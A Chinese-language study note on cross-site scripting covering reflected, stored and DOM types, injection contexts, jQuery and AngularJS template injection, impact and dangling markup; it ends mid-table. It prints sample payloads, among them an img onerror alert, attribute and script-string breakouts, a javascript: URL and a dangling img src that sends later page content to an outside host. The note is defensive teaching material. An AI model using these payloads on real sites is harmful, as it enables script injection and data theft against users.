# XSS跨站脚本攻击

## 1. 漏洞本质

XSS (Cross-site Scripting, 跨站脚本攻击) 的本质是：

**应用程序把攻击者可控的数据输出到浏览器可解析、可执行的上下文中，导致非预期JavaScript在目标站点页面环境中执行。**

它不是单纯的“输入里出现`<script>`”，而是Web应用没有正确区分“数据”和“代码”。当用户输入、URL参数、存取数据或者前端可控数据被拼接进HTML、属性、JavaScript、DOM sink或客户端模板中时，浏览器可能会把这些数据解释为页面结构或者脚本逻辑。

简化链路如下：

```
攻击者可控输入
    ↓
服务端反射 / 服务端存储 / 前端读取
    ↓
数据进入 HTML、属性、JavaScript、DOM 或模板上下文
    ↓
浏览器或前端框架将其解析为代码
    ↓
脚本在目标站点上下文中执行
```

XSS 的危险点在于：脚本不是在攻击者域名下执行，**而是在受害者访问的目标站点上下文中执行**。只要脚本运行在同源环境中，它就可能读取页面内容、操作 DOM、发起同源请求、获取页面内 token，或者代替当前用户执行业务操作。PortSwigger 原始资料也强调，XSS 可以破坏用户与应用之间的交互，并可能让攻击者以受害者身份执行操作或访问数据。

需要注意的是，XSS 的风险不是固定等级。它取决于页面是否包含敏感数据、用户是否登录、受害者权限高低、Cookie 是否设置 `HttpOnly`、CSP 是否有效，以及业务操作是否存在二次验证。

---

## 2. 风险成立条件

XSS风险通常依赖以下几个条件：

### 2.1 存在攻击者可控数据

攻击者可控数据可以来自：

```
URL 查询参数
URL path
URL fragment / hash
POST 表单
请求头
评论内容
用户昵称
文件名
站内信
第三方接口数据
document.cookie
localStorage / sessionStorage
postMessage
window.name
```

在传统反射型和存储型 XSS 中，可控数据通常由服务端接收并输出到响应页面中；在 DOM XSS 中，可控数据往往由前端 JavaScript 从浏览器环境或页面状态中读取。

### 2.2 数据进入了可解析上下文

XSS是否成立，关键看数据最终进入了哪里。

常见上下文包括：

| 上下文              | 风险点                       |
| ---------------- | ------------------------- |
| HTML 标签之间        | 输入可能被解析为新标签               |
| HTML 属性值         | 输入可能逃逸属性，或注入事件属性          |
| URL 属性           | `href`、`src` 等属性可能接受危险协议  |
| JavaScript 字符串   | 输入可能跳出字符串并插入语句            |
| JavaScript 模板字面量 | `${...}` 表达式可能被执行         |
| DOM sink         | 前端 API 可能把字符串解析成 HTML 或代码 |
| 客户端模板            | 框架可能把输入当模板表达式执行           |

所以 XSS 的核心判断不是“有没有过滤 `<script>`”，而是：

```
可控数据最终处于什么解析上下文？
浏览器或框架会如何解释它？
应用是否做了与该上下文匹配的安全处理？
```

### 2.3 缺少上下文相关的安全处理

不同上下文需要不同防护。HTML 文本中的编码规则，不能直接套到 JavaScript 字符串、URL 属性或 AngularJS 模板表达式中。

例如：

```html
<div>user_input</div>
```

这里重点是编码 `<`、`>`、`&` 等 HTML 特殊字符。

但如果是：

```html
<script>
var name = 'user_input';
</script>
```

此时仅做 HTML 编码并不够，关键是 JavaScript 字符串语义是否被破坏。

再比如：

```html
<a href="user_input">back</a>
```

这里不仅要处理 HTML 属性编码，还要校验 URL 协议。否则即使属性没有逃逸，危险协议仍可能形成脚本执行入口。

---

## 3. XSS类型

### 3.1 反射型XSS

反射型 XSS 是指应用从当前 HTTP 请求中接收数据，并立即以不安全方式把该数据包含在响应页面中。

典型场景：

```html
用户访问：
/search?term=test

页面返回：
<p>You searched for: test</p>
```

如果 `term` 参数未被正确编码，攻击者可以构造带有脚本语义的链接，诱导用户访问。服务端把参数原样反射到页面，浏览器再按 HTML 或 JavaScript 规则解析它。

反射型 XSS 的特点：

| 特征     | 说明                    |
| ------ | --------------------- |
| 数据来源   | 当前 HTTP 请求            |
| 数据是否保存 | 通常不保存                 |
| 触发方式   | 常依赖诱导用户访问特制链接         |
| 核心判断   | 输入是否出现在响应中，以及处于什么上下文  |
| 风险边界   | 受用户登录状态、诱导方式、目标页面权限影响 |

反射型 XSS 一般需要外部传递机制，例如邮件、聊天消息、第三方页面链接等。它的稳定性通常弱于存储型 XSS，但如果目标用户权限较高，仍可能造成严重影响。

### 3.2 存储型XSS

存储型 XSS 是指应用把攻击者提交的数据保存起来，并在后续响应中以不安全方式输出给其他用户。

典型链路：

```
提交评论 / 昵称 / 工单 / 消息 / 文件名
    ↓
数据进入数据库、缓存、日志或第三方数据源
    ↓
其他用户访问相关页面
    ↓
应用把存储数据输出到页面
    ↓
浏览器执行恶意脚本
```

存储型 XSS 的关键不只是“输入点”，还要找“出口点”。一个用户提交的数据，可能不会出现在当前页面，而是出现在后台管理页、审计日志、消息通知、邮件模板、用户资料页或其他角色可见页面中。

它的风险通常高于反射型 XSS，因为攻击者不一定需要每次诱导用户访问特制链接。只要恶意数据已经进入系统，后续访问相关页面的用户都可能触发。

| 对比项      | 反射型 XSS      | 存储型 XSS        |
| -------- | ------------ | -------------- |
| 数据来源     | 当前请求         | 已保存数据          |
| 是否持久     | 不持久          | 持久或半持久         |
| 是否依赖外部诱导 | 通常依赖         | 不一定            |
| 触发对象     | 点击特制链接的用户    | 访问污染页面的用户      |
| 典型位置     | 搜索、错误提示、跳转参数 | 评论、昵称、后台日志、站内信 |

存储型 XSS 的测试难点在于入口点和出口点不一定一一对应。原始资料中也强调，入口点可能包括 URL 参数、消息体、路径、请求头甚至带外数据源；出口点则可能是任意用户收到的任意 HTTP 响应。

---

### 3.3 DOM型XSS

DOM 型 XSS 是指漏洞主要发生在浏览器端 JavaScript 中。前端脚本从攻击者可控的 source 读取数据，然后把数据传入危险 sink，最终导致 HTML、DOM 或 JavaScript 执行上下文被污染。

核心链路：

```
Source → 数据传播 → Sink → 浏览器解析 / JS 执行
```

其中：

- **Source** 是攻击者可控数据的来源；
- **Sink** 是会把数据解释为 HTML、URL、脚本或代码的危险操作点。

常见 source：

```js
location.href
location.search
location.hash
document.URL
document.referrer
window.name
document.cookie
localStorage
sessionStorage
postMessage
```

常见 sink：

```html
innerHTML
outerHTML
document.write()
document.writeln()
insertAdjacentHTML()
eval()
Function()
setTimeout(string)
setInterval(string)
location
jQuery.html()
jQuery.append()
jQuery.attr()
jQuery.parseHTML()
```

理解样例：

```js
const q = new URLSearchParams(location.search).get("q");
document.body.innerHTML = q;
```

这个样例说明的是：`location.search` 是 source，`innerHTML` 是 sink。攻击者控制 URL 参数，前端脚本把参数写入 `innerHTML`，浏览器就会把它作为 HTML 片段解析。

但要注意，`innerHTML` 在现代浏览器中通常不会直接执行插入的 `<script>`，也不会触发某些 SVG `onload` 场景。它仍然可能通过其他标签、事件属性或可交互元素形成风险。也就是说，DOM XSS 不能简单理解成“innerHTML + script 标签”，要看具体 sink 的解析行为。

PortSwigger 对 DOM XSS 的研究非常重视 source 到 sink 的数据流，原始资料也专门区分了 HTML sink、JavaScript 执行 sink、第三方库 sink，以及 DOM Invader 这类辅助分析工具。

---

## 4. XSS测试判断模型

### 4.1 反射型XSS判断模型

反射型 XSS 的核心是找请求输入与响应输出之间的直接关系：

```
入口点 → 唯一标记 → 响应反射点 → 上下文判断 → 浏览器验证
```

重点不是一开始就上 payload，而是先确认：

1. 哪些参数、路径、请求头可控；
2. 输入是否出现在响应中；
3. 出现位置属于 HTML、属性、JavaScript 还是其他上下文；
4. 应用是否做了编码、过滤、替换或截断；
5. 浏览器最终是否会把该内容解析为可执行代码。

这种模型适合搜索框、错误提示、跳转参数、筛选条件等场景。

### 4.2 存储型XSS

存储型 XSS 的核心是找入口点和出口点之间的数据流：

```
入口点 → 存储层 → 出口点 → 输出上下文 → 用户触发
```

入口点可能是评论、昵称、消息、工单、文件名等。出口点可能是普通用户页面，也可能是后台管理页面、审计日志、通知中心或邮件模板。

判断重点：

| 阶段    | 关注点                       |
| ----- | ------------------------- |
| 入口点   | 数据是否可控，是否进入存储             |
| 存储层   | 是否被过滤、转义、截断、规范化           |
| 出口点   | 哪些用户、哪些页面会看到该数据           |
| 输出上下文 | HTML、属性、JavaScript、DOM、模板 |
| 触发条件  | 是否需要登录、权限、特定操作或页面访问       |

存储型 XSS 不要只测当前提交后的页面。很多真实问题出在“后台查看用户提交内容”或者“日志展示未编码”。

### 4.3 DOM XSS 判断模型

DOM XSS 的判断模型更接近前端代码审计：

```
可控 source → 前端变量传播 → 危险 sink → 解析上下文 → 执行效果
```

对于 HTML sink，可以在浏览器开发者工具中搜索随机标记，观察它最终进入 DOM 的位置。注意不要只看“查看源代码”，因为 DOM XSS 的关键往往是 JavaScript 修改后的 DOM，而不是服务端原始响应。

对于 JavaScript 执行 sink，例如 `eval()`、`setTimeout(string)`、`Function()`，输入可能不会出现在 DOM 树中。此时更重要的是搜索 source 的读取位置，跟踪变量传播，确认它是否传入危险 sink。

PortSwigger 原始资料也指出，HTML sink 可以通过 DOM 搜索定位，而 JavaScript 执行 sink 往往需要调试器跟踪数据流；`DOM Invader` 可以辅助识别复杂、压缩后的 JavaScript 代码中的 source/sink 关系。

---

## 5. XSS上下文

XSS 上下文是整篇 XSS 笔记的核心。不同上下文决定了不同利用方式，也决定了不同防护方式。

### 5.1 HTML标签内容上下文

当攻击者可控数据出现在 HTML 标签之间时，浏览器会把它作为 HTML 文本解析。

```html
<div>user_input</div>
```

如果应用没有正确编码 `<`、`>`、`&` 等字符，攻击者可能引入新的 HTML 标签，从而创建脚本执行点。

理解样例：

```html
<img src=1 onerror=alert(1)>
```

该样例说明的是：在 HTML 标签内容上下文中，攻击者不一定需要 `<script>` 标签，也可以通过支持事件属性的元素触发 JavaScript。它的适用边界是：输入必须能进入 HTML 解析环境，且相关字符没有被编码或阻断。

防护重点：

```
把不可信数据作为文本输出，而不是 HTML 输出。
对 HTML 特殊字符进行上下文编码。
```

### 5.2 HTML 属性上下文

当输入出现在属性值中时，风险取决于能否突破当前属性，或者该属性本身是否具备脚本语义。

```html
<input value="user_input">
```

1.如果引号没有被正确编码，攻击者可能闭合属性值并注入新的属性：

```html
" autofocus onfocus=alert(document.domain) x="
```

该样例说明的是“**属性逃逸 + 事件属性触发**”。它依赖输入能控制属性边界，并且事件可以被触发。

2.如果输入位于 `href` 等 URL 属性中，即使没有逃逸属性，也可能存在风险：

```html
<a href="user_input">back</a>
```

如果应用没有限制协议，`javascript:` 伪协议可能在用户点击链接时执行脚本。

防护重点：

```html
属性值必须加引号。
按 HTML 属性上下文编码引号、尖括号和 &。
URL 类属性必须做协议白名单。
不要允许 javascript:、data: 等危险协议进入可点击位置。
```

### 5.3 JavaScript 字符串上下文

当输入出现在已有 JavaScript 代码中时，关键是它是否能突破字符串、表达式或语句边界。

典型场景：

```html
<script>
var input = 'user_input';
</script>
```

如果输入没有经过 JavaScript 字符串上下文编码，攻击者可能闭合字符串并插入新的语句：

```html
';alert(document.domain)
# ' 用于闭合原字符串
# ; 用于开始新语句
# alert()执行代码
# 双斜杠用于注释剩余代码
```

适用边界：输入位于单引号 JavaScript 字符串中，且引号、反斜杠、换行等字符处理不当。不同字符串边界需要不同处理，不能把这个形式泛化到所有上下文。

还有一种常见错误是只转义引号，不转义反斜杠。攻击者可能用额外反斜杠抵消应用添加的转义，使原本被保护的引号重新成为字符串终止符。

防护重点：

```
不要把不可信数据直接拼进 script。
必须输出到 JS 时，使用可靠 JSON 序列化或 JS 字符串编码。
避免拼接生成可执行代码。
```

### 5.4 JavaScript 模板字面量上下文

JavaScript 模板字面量使用反引号包裹，并允许 `${...}` 表达式求值。

```js
const msg = `Welcome, user_input`;
```

如果攻击者输入位于模板字面量内部，可能不需要闭合反引号，而是直接注入表达式：

```js
${alert(document.domain)}
```

这个样例说明的是：模板字面量内部的 `${...}` 不是普通文本，而是 JavaScript 表达式执行入口。

适用边界：输入必须位于模板字面量中，并且 `${`、`}` 等字符没有被正确处理。防护时不能把模板字面量当普通字符串处理。

防护重点：不要把不可信数据拼进模板字面量源码，若必须输出，按 JavaScript 字符串语义安全序列化。

### 5.5 事件处理器中的混合上下文

有些输入会进入 HTML 属性中的 JavaScript，例如：

```html
<a onclick="var x='user_input'">click</a>
```

这是混合上下文：外层是 HTML 属性，内层是 JavaScript 代码。浏览器会先解析 HTML 属性，再把属性值作为事件处理器代码处理。

这类场景里，单一编码可能不够。因为数据既受 HTML 属性解析影响，也受 JavaScript 字符串解析影响。

防护重点：

```
避免把不可信数据放进事件处理器。
不要使用内联事件。
使用 addEventListener 绑定固定函数。
把不可信数据作为普通文本或 data-* 属性处理，并读取时做安全使用。
```

### 5.6 URL 属性上下文

URL 属性包括：

```html
href
src
action
formaction
xlink:href
```

这些位置不一定需要逃逸 HTML 属性才能产生风险。只要应用把不可信 URL 直接写入可触发位置，危险协议就可能成为执行入口。

典型风险：

```html
<a href="javascript:alert(1)">back</a>
```

适用边界：用户需要点击或触发该 URL，浏览器和 CSP 没有阻止相关协议，应用没有进行协议白名单校验。

防护重点：

```
只允许明确安全的协议和路径。
优先允许相对路径或固定可信域名。
拒绝 javascript:、data: 等危险协议。
URL 编码不能替代协议校验。
```

---

## 6. DOM XSS关键机制

DOM XSS 值得单独成章。它不是“另一种 payload”，而是前端数据流漏洞。

### 6.1 Source 与 Sink

DOM XSS 的核心是 source 到 sink 的污染链路。

```
Source：攻击者可控数据来源
Sink：会产生 HTML 解析、URL 导航、脚本执行或 DOM 修改的危险 API
```

常见 source：

| Source              | 说明                           |
| ------------------- | ---------------------------- |
| `location.search`   | URL 查询参数                     |
| `location.hash`     | URL fragment，不会发送到服务端，但前端可读取 |
| `document.referrer` | 来源页面，可受跳转链影响                 |
| `window.name`       | 跨页面可保持的窗口名称                  |
| `postMessage`       | 跨窗口消息，依赖 origin 校验           |
| `localStorage`      | 本地存储数据，可能被历史污染               |
| `document.cookie`   | Cookie 内容，受 `HttpOnly` 限制    |

常见 sink：

| Sink                   | 风险                   |
| ---------------------- | -------------------- |
| `innerHTML`            | 把字符串作为 HTML 片段解析     |
| `outerHTML`            | 替换当前元素及其内容           |
| `document.write()`     | 写入 HTML，可影响页面解析流     |
| `insertAdjacentHTML()` | 在指定位置插入 HTML         |
| `eval()`               | 把字符串作为 JavaScript 执行 |
| `Function()`           | 动态构造函数执行代码           |
| `setTimeout(string)`   | 字符串参数会被当代码执行         |
| `location`             | 可能触发危险 URL 跳转        |
| `jQuery.html()`        | 类似 HTML 插入 sink      |
| `jQuery.attr()`        | 可能污染 `href` 等危险属性    |

判断 DOM XSS 时，不能只问“页面有没有反射”。很多 DOM XSS 不会出现在服务端响应源码中，只会在浏览器运行 JavaScript 后出现在 DOM 或执行流中。

### 6.2 HTML Sink 与 JavaScript Sink 的区别

HTML sink 会把**字符串作为 HTML 结构解析**，例如：

```html
element.innerHTML = userInput;
```

这类问题可以通过开发者工具观察 DOM，查看输入是否进入标签、属性或文本位置。

JavaScript sink 会把**字符串作为代码执行**，例如：

```js
eval(userInput);
setTimeout(userInput, 1000);
new Function(userInput)();
```

这类问题不一定会在 DOM 中留下明显痕迹，更适合用代码搜索、断点和变量跟踪判断。

| 类型              | 典型 sink                                               | 分析方式           |
| --------------- | ----------------------------------------------------- | -------------- |
| HTML sink       | `innerHTML`、`document.write()`、`insertAdjacentHTML()` | 搜索 DOM、判断插入上下文 |
| JavaScript sink | `eval()`、`Function()`、`setTimeout(string)`            | 搜索代码、断点调试、跟踪变量 |
| URL sink        | `location`、`href`、`src`                               | 校验协议和跳转目标      |
| 框架 sink         | `jQuery.html()`、`$()`、AngularJS 表达式                   | 结合框架解析规则判断     |

PortSwigger 原始资料里也专门指出，HTML sink 可以通过 DOM 搜索定位；JavaScript 执行 sink 往往无法直接在 DOM 中搜索，需要借助 JavaScript 调试器跟踪数据流。

### 6.3 `document.write()` 与 `innerHTML` 的差异

`document.write()` 和 `innerHTML` 都能把字符串写入页面，但解析行为不同。

`document.write()` 会参与文档解析流，因此在某些场景下可以处理写入的 `<script>` 元素：

```js
document.write(userInput);
```

如果 `userInput` 可控，风险较高。它还可能受当前文档结构影响，例如需要先闭合已有标签才能进入目标上下文。

`innerHTML` 会把字符串作为 HTML 片段插入 DOM，但现代浏览器通常不会执行通过 `innerHTML` 插入的 `<script>` 标签，也不一定触发某些 SVG 事件。它仍然可能通过事件属性、图片加载错误、iframe、URL 属性等方式形成执行点。

```
innerHTML 会造成 HTML 解析，是否能执行脚本取决于
插入内容、浏览器行为、标签类型、事件触发条件和 CSP。
```

### 6.4 jQuery 中的 DOM XSS

PortSwigger 对 jQuery DOM XSS 的介绍很典型。

#### `attr()` 污染 URL 属性

示例：

```js
$(function() {
    $('#backLink').attr(
        "href",
        new URLSearchParams(window.location.search).get('returnUrl')
    );
});
```

这里：

```
source：location.search
sink：jQuery attr("href", ...)
风险点：攻击者控制 href 属性值
```

如果应用没有限制 `returnUrl` 的协议，攻击者可以把危险 URL 写入链接。该风险不一定自动触发，通常需要用户点击，但它仍然属于 DOM XSS 或 DOM-based open redirect / script URL 风险的一部分。

防护重点：

```
不要直接把 URL 参数写入 href。
对跳转地址做白名单校验。
只允许相对路径或可信源。
```

#### `$()` 选择器与 `location.hash`

jQuery 历史上一个典型问题是把 `location.hash` 直接传给 `$()` 选择器：

```js
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

开发者原意是根据 URL fragment 定位页面元素，例如：

```
#section1
```

但如果旧版本 jQuery 或不安全代码把 hash 当作 HTML 片段解析，就可能造成 DOM 注入。PortSwigger 原始资料中也提到，较新 jQuery 已经修复了部分以 `#` 开头输入导致 HTML 注入的问题，但遗留应用仍可能存在风险。

这个案例说明：DOM XSS 不一定来自显眼的 `innerHTML`，第三方库的选择器、属性修改、HTML 插入方法都可能成为 sink。

### 6.5 DOM 型反射 XSS 与 DOM 型存储 XSS

DOM XSS 还可以和反射型、存储型结合。

#### 反射型 DOM XSS

服务器把请求中的数据反射进页面，但不是直接形成 XSS。真正危险发生在前端脚本再次读取并处理这段反射数据时。

链路：

```
请求参数
  ↓
服务端反射到 HTML / JS 数据块
  ↓
前端脚本读取该数据
  ↓
写入危险 sink
  ↓
XSS 触发
```

例如：

```js
eval('var data = "reflected string"');
```

这种问题既有服务端反射，也有前端危险处理。不能只归类成普通反射型 XSS。

#### 存储型 DOM XSS

服务器保存攻击者数据，并在后续页面中输出。前端脚本读取该数据后，把它写入危险 DOM sink。

链路：

```js
攻击者提交数据
  ↓
服务端存储
  ↓
后续页面输出为普通数据
  ↓
前端脚本读取
  ↓
innerHTML / eval / jQuery.html 等 sink
```

例如：

```js
element.innerHTML = comment.author;
```

这里服务端可能认为自己只是输出了普通字段，但前端把字段当 HTML 插入，最终由浏览器解析。

这个分类对工程排查很有用：有些 XSS 不是单纯后端模板问题，而是“后端提供数据 + 前端危险渲染”的组合问题。

---

## 7. 客户端模板注入

它是 XSS 上下文中的重要特殊分支，尤其是 AngularJS 场景。

### 7.1 漏洞本质

客户端模板注入是指应用把不可信输入嵌入前端模板中，模板引擎在浏览器端渲染页面时，把这些输入当作模板表达式解析并执行。

普通 XSS 依赖浏览器把输入解析为 HTML 或 JavaScript；客户端模板注入依赖的是**前端框架的模板表达式执行机制**。

简化示例：

```html
<div ng-app>
    {{ user_input }}
</div>
```

如果 `user_input` 可控，并且 AngularJS 会解析其中的表达式，攻击者可能不需要 `<script>`、事件属性甚至尖括号，也能通过模板表达式执行代码。

这就是它和普通 HTML XSS 的区别：

| 对比项             | 普通 XSS           | 客户端模板注入       |
| --------------- | ---------------- | ------------- |
| 主要解析者           | 浏览器 HTML / JS 引擎 | 前端模板引擎        |
| 常见入口            | HTML、属性、JS 字符串   | 模板表达式         |
| 是否依赖 `<script>` | 不一定              | 通常不依赖         |
| 防护重点            | 上下文编码、安全 DOM API | 不让不可信输入成为模板源码 |
| HTML 编码是否足够     | 看上下文             | 通常不足以单独保证安全   |

PortSwigger 原始资料明确提到，客户端模板注入是用户输入被动态嵌入客户端模板后，框架扫描并执行模板表达式所导致的问题；其资料重点以 AngularJS 为例展开。

### 7.2 AngularJS与`ng-app`

AngularJS 的典型风险点在于：当页面中存在 `ng-app` 时，AngularJS 会接管对应 DOM 区域并解析模板表达式。

例如：

```html
<div ng-app>
    {{ expression }}
</div>
```

在正常业务中，表达式用于绑定数据。但如果表达式内容来自用户输入，攻击者就可能构造恶意模板表达式，使框架在渲染时执行非预期逻辑。

这类风险的核心不是 HTML 标签注入，而是：

```
用户输入进入模板源码
    ↓
AngularJS 扫描表达式
    ↓
表达式被求值
    ↓
形成脚本执行或安全边界突破
```

所以，客户端模板注入不应该只归入“HTML 上下文”。它更准确地属于“框架模板表达式上下文”。

### 7.3 AngularJS 沙箱不是可靠安全边界

AngularJS 旧版本曾经包含沙箱机制，用于限制模板表达式访问危险对象，例如 `window`、`document`、`Function` 构造函数、`__proto__` 等危险属性。

但这个沙箱并不是可靠安全边界。原始资料中也说明，AngularJS 团队本身并未把沙箱视为安全边界，而安全研究人员发现过多种绕过方式，最终 AngularJS 在 1.6 版本中移除了沙箱。

沙箱的大致思路是：

```
解析表达式
    ↓
重写 JavaScript 代码
    ↓
检查危险对象、危险属性、危险函数
    ↓
阻止访问 window、document、constructor 等对象或属性
```

但问题在于：模板表达式本身过于接近 JavaScript 执行环境，只要存在对象访问、函数调用、过滤器、原型链或框架内部机制，就可能出现绕过空间。

笔记里不需要记复杂逃逸 payload，但要记住这个判断：

```
不要把 AngularJS 沙箱当作安全措施。
只要不可信输入能进入模板表达式，风险就已经成立。
```

### 7.4 沙箱逃逸的机制意义

其中一个典型思路是：通过修改 JavaScript 原型方法或利用 AngularJS 表达式解析差异，使沙箱误判恶意表达式为安全表达式。原始资料中提到过修改 `charAt()` 相关行为、借助 `$eval()` 或 `orderBy` 过滤器传递表达式等机制。

```
沙箱逃逸不是单个 payload 问题，而是表达式解析器、JavaScript 原型链、框架过滤器和对象访问控制之间的边界问题。
```

也就是说，风险点不是“某个特殊字符串可以弹窗”，而是：

1. AngularJS 允许模板表达式执行；
2. 沙箱试图限制危险对象访问；
3. JavaScript 语言特性和框架内部机制可能改变沙箱判断；
4. 结果导致表达式突破限制，执行任意 JavaScript。

### 7.5 AngularJS 与 CSP 绕过

CSP 可以限制内联脚本、事件属性和外部脚本加载，但 AngularJS 场景下，模板表达式和框架事件机制可能改变攻击面。

原始资料提到，在 AngularJS 的 CSP 模式下，框架会避免使用 `Function` 构造函数，标准沙箱逃逸方式可能失效。但 AngularJS 自身事件、`$event` 对象、过滤器等机制仍可能形成 CSP 绕过路径。

```
CSP 限制的是浏览器脚本执行策略；
AngularJS 模板表达式是框架层执行机制；
当框架表达式能间接调用全局函数或处理事件对象时，CSP 的防护边界可能被削弱。
```

所以，客户端模板注入的防护不能依赖 CSP。CSP 是纵深防御，不是模板注入修复方案。

### 7.6 为什么 HTML 编码不足以防客户端模板注入

这是客户端模板注入最容易误解的地方。

HTML 编码可以防止输入被浏览器解析为 HTML 标签，例如把 `<` 编码为 `&lt;`。但模板框架可能会在渲染过程中对内容进行解码、扫描并解析模板表达式。

例如，攻击者不一定需要输入 `<script>`，只需要让表达式语法进入模板区域：

```
{{ expression }}
```

如果框架会处理这个表达式，那么 HTML 编码并不一定能阻止模板引擎执行它。

防护重点应当是：

```
不要把不可信输入作为模板源码。
不要动态拼接模板表达式。
用户数据只能作为数据绑定值，而不是模板代码。
必要时过滤模板表达式语法。
```

这个点可以和 SSTI 类比：SSTI 是服务端模板表达式执行，客户端模板注入是浏览器端框架表达式执行。二者位置不同，但本质都是“模板引擎把不可信输入当表达式处理”。

### 7.7 客户端模板注入的防护原则

客户端模板注入的防护重点：

| 防护点      | 说明                                 |
| -------- | ---------------------------------- |
| 不拼接模板源码  | 不要把用户输入插进模板字符串再交给框架编译              |
| 区分数据和模板  | 用户输入只能作为数据值绑定                      |
| 避免动态编译   | 谨慎使用动态 template、compile、render 类能力 |
| 过滤表达式语法  | 对必须进入模板区域的文本，过滤 `{{ }}` 等表达式边界     |
| 升级旧框架    | 避免使用存在历史沙箱绕过问题的 AngularJS 旧版本      |
| CSP 只作辅助 | 不能把 CSP 当作模板注入的主要修复方式              |

总结一句：

```
客户端模板注入的根因不是标签过滤失败，而是不可信输入进入了模板表达式执行边界。
```

---

## 8. 利用影响和风险边界

XSS 的验证方式通常是让浏览器执行一段可见的 JavaScript，例如 `alert()` 或 `print()`。但这类 PoC 只证明“当前页面上下文中可以执行脚本”，不等于已经证明完整业务危害。

PortSwigger 原始资料也提到，`alert()` 长期用于 XSS 验证，但 Chrome 对跨域 iframe 调用 `alert()` 做过限制，因此部分实验会使用 `print()` 作为替代验证方式。

更准确地说，XSS 的实际影响取决于：

```
页面是否包含敏感数据
用户是否处于登录状态
受害用户权限高低
Cookie 是否设置 HttpOnly
业务操作是否需要二次验证
CSP 是否有效
脚本能否读取响应或页面内 token
```

因此，XSS 的风险评估不能只写“可以弹窗”，也不能机械写“盗 Cookie”。现代 Web 环境下，XSS 更核心的危害是：**攻击者可以在受害者浏览器中，以目标站点同源上下文执行脚本，从而读取页面可访问数据，并代替用户发起当前权限范围内的操作。**

### 8.1 读取页面数据

XSS 运行在目标站点页面上下文中，因此可以读取当前页面 DOM 中的内容。

可能被读取的数据包括：

```
页面中展示的用户信息
订单、邮箱、站内消息
隐藏字段中的 CSRF token
前端渲染出的接口数据
页面内嵌的配置对象
非 HttpOnly 的 Cookie
```

风险边界在于：JavaScript 只能读取浏览器同源策略允许访问的内容。`HttpOnly` Cookie 无法被 JavaScript 直接读取；跨源响应通常也不能被直接读取。但如果目标页面本身已经渲染了敏感数据，XSS 就可以从 **DOM 或同源接口**中获取这些数据。

### 8.2 Cookie与会话风险

窃取 Cookie 是传统 XSS 影响之一，但在现代应用中不能简单泛化。

风险成立依赖：

| 条件                    | 说明                   |
| --------------------- | -------------------- |
| Cookie 未设置 `HttpOnly` | 否则 JavaScript 无法直接读取 |
| 会话未绑定额外风控             | 例如 IP、设备指纹、二次验证      |
| Cookie 仍有效            | 会话可能已经过期或被刷新         |
| 业务没有额外确认              | 敏感操作可能需要密码、验证码或 MFA  |

所以更工程化的表述应该是：

```
XSS 可能导致会话相关风险，但是否能直接劫持会话取决于 Cookie 属性、会话绑定策略和业务二次验证。
```

面试或报告里不要把所有 XSS 都写成“盗 Cookie”，这会显得很旧，也不够准确。

### 8.3 捕获用户输入

XSS 可以修改页面结构或插入新的交互元素，从而诱导用户输入敏感信息。PortSwigger 原始资料提到，利用 XSS 捕获密码时，攻击者可能借助密码管理器的自动填充行为读取用户填入的密码，但这依赖用户环境和密码管理器行为。

这种风险的本质不是“浏览器密码库被直接攻破”，而是：

```
脚本在可信页面中运行
    ↓
用户或密码管理器信任当前页面
    ↓
敏感输入进入攻击者可控的 DOM 或监听逻辑
```

风险边界：

- 依赖用户是否保存密码；
- 依赖密码管理器是否自动填充；
- 依赖页面结构是否能被脚本修改；
- 依赖 CSP、表单策略和浏览器行为。

### 8.4 代替用户执行业务操作

XSS 可以在受害者登录状态下发起同源请求，因此经常能代替用户执行操作，例如修改资料、发送消息、提交表单、触发后台功能等。

这里要区分 XSS 和 CSRF：

| 对比项           | CSRF                     | XSS                  |
| ------------- | ------------------------ | -------------------- |
| 是否能发请求        | 可以                       | 可以                   |
| 是否能读取响应       | 通常不能                     | 同源下通常可以              |
| 是否能读取页面 token | 不能直接读取                   | 可以读取页面可访问 token      |
| 攻击能力          | 偏单向请求伪造                  | 偏双向页面控制              |
| 防护重点          | CSRF token、SameSite、二次确认 | 输出编码、安全 DOM、CSP、框架安全 |

PortSwigger 原始资料也强调，XSS 可以读取 CSRF token，再使用该 token 发起请求；传统 CSRF 是“单向”的，而 XSS 支持读取响应和页面内容，因此能形成更强的组合攻击。

所以在风险描述中，可以写：

```
当 XSS 存在时，普通 CSRF token 往往不足以独立保护敏感操作，因为脚本可能先读取 token，再以用户身份发起同源请求。
```

### 8.5 管理员后台与高权限用户风险

XSS 的严重程度和触发用户权限强相关。普通用户页面中的 XSS 可能只影响当前用户；如果存储型 XSS 出现在后台审核、工单查看、日志展示、用户反馈等场景，一旦管理员触发，影响会明显扩大。

常见高风险场景：

```
用户提交内容在后台未编码展示
文件名、昵称、备注进入管理端页面
工单、反馈、日志、审计记录被管理员查看
富文本内容在审核后台原样渲染
```

这类问题本质上是“低权限输入污染高权限输出”。  
在漏洞报告或简历项目中，这种描述比单纯写“弹窗”更有价值。

## 9. 特殊机制: 悬空标记注入

悬空标记注入（Dangling markup injection）是一种在无法形成完整 XSS 时仍可能泄露页面数据的技术。它的本质是：**攻击者注入一个未闭合的 HTML 标签或属性，让浏览器继续向后解析页面内容，并把后续内容吞入某个会发起外部请求的属性中。**

它通常发生在攻击者可以破坏 HTML 结构，但由于过滤、CSP 或其他限制无法直接执行脚本的场景。PortSwigger 原始资料也将其定义为一种在无法进行完整 XSS 时捕获跨域数据的技术。

### 9.1 悬空标记注入的解析机制

假设页面中存在类似结构：

```html
<input type="text" value="USER_INPUT">
```

如果攻击者能闭合当前属性和标签，就可能重新进入 HTML 上下文。普通 XSS 失败时，攻击者仍可能构造一个未闭合的外部资源属性：

```html
"><img src='https://example.invalid/?
```

这个样例的机制是：

```
闭合原属性
    ↓
创建 img 标签
    ↓
打开 src 属性但不闭合
    ↓
浏览器继续向后查找属性结束符
    ↓
注入点之后的页面内容被拼进 URL
    ↓
浏览器尝试请求外部资源
```

该样例只用于说明解析机制，不代表所有环境通用。它依赖：

- 注入点能破坏属性或标签边界；
- 后续页面内容中存在可被吞入的敏感数据；
- 浏览器允许构造该资源请求；
- CSP 没有阻止相关外部请求；
- 现代浏览器没有因特殊字符而拦截该请求。

### 9.2 悬空标记注入的风险

悬空标记注入可能泄露注入点之后的一段页面内容，例如：

```
CSRF token
邮箱地址
订单信息
隐藏字段
页面内联配置
部分 HTML 片段
```

它和 XSS 的区别在于：悬空标记注入不一定执行 JavaScript。它利用的是 HTML 解析和外部资源请求，而不是脚本执行。

可以这样理解：

| 类型      | 核心能力                |
| ------- | ------------------- |
